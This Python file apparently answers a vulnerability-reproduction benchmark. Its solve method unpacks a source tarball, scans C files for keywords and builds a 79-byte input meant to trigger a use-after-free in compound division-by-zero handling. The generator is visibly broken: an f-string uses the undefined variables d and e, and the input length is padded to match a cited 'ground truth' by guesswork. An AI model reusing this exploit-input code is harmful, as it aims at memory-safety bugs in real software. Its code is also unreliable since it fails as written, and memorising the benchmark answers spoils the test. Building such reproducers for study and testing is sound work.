import os
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (assuming single top-level dir)
            root_dirs = [d for d in os.listdir(tmpdir) 
                        if os.path.isdir(os.path.join(tmpdir, d))]
            if not root_dirs:
                work_dir = tmpdir
            else:
                work_dir = os.path.join(tmpdir, root_dirs[0])
            
            # Look for source files to understand the format
            c_files = list(Path(work_dir).rglob("*.c"))
            cpp_files = list(Path(work_dir).rglob("*.cpp"))
            all_src = c_files + cpp_files
            
            # Read source to understand the vulnerability better
            vuln_patterns = ["compound", "division", "zero", "free", "destroy"]
            found_vuln = False
            test_input = None
            
            for src_file in all_src:
                try:
                    content = src_file.read_text(encoding='utf-8', errors='ignore')
                    if any(pattern in content.lower() for pattern in vuln_patterns):
                        found_vuln = True
                        # Try to extract test patterns or understand format
                        lines = content.split('\n')
                        for line in lines:
                            if 'test' in line.lower() or 'example' in line.lower():
                                # Look for quoted strings that might be test inputs
                                import re
                                matches = re.findall(r'["\']([^"\']{10,})["\']', line)
                                if matches:
                                    test_input = matches[0].encode()
                                    break
                        if test_input:
                            break
                except:
                    continue
            
            # If we found a test input, use it
            if test_input and len(test_input) <= 79:
                return test_input[:79]
            
            # Otherwise generate based on common heap UAF patterns
            # For compound division by zero, we need to trigger division by zero
            # and early free of result operand. Common pattern: "a/(b-c)" where b=c
            # Ground truth is 79 bytes, so we create input of that length
            
            # Common patterns that trigger division by zero:
            # 1. "0/0" 
            # 2. "1/0"
            # 3. "a/(b-b)"
            # 4. Complex expressions that evaluate to division by zero
            
            # We'll generate a compound expression that should trigger the bug
            # Using 79 bytes exactly as ground truth suggests optimal length
            
            # Pattern: create expression with division by (x-x) where x is freed early
            # Add enough complexity to trigger compound operations
            base_expr = "((a=1)/(b=0))"  # Simple division by zero
            # Need 79 bytes total
            target_len = 79
            current = base_expr.encode()
            
            if len(current) < target_len:
                # Pad with spaces and additional operations that don't affect the division
                # but might trigger compound processing
                padding = " " * (target_len - len(current) - 10)
                # Add compound operations before the division
                expr = f"c=2{d};d=3{e};e=4{f};{base_expr}{padding}"
                # Trim to exact length
                expr = expr[:target_len]
                return expr.encode()
            else:
                # If too long, use minimal pattern
                return base_expr[:target_len].encode()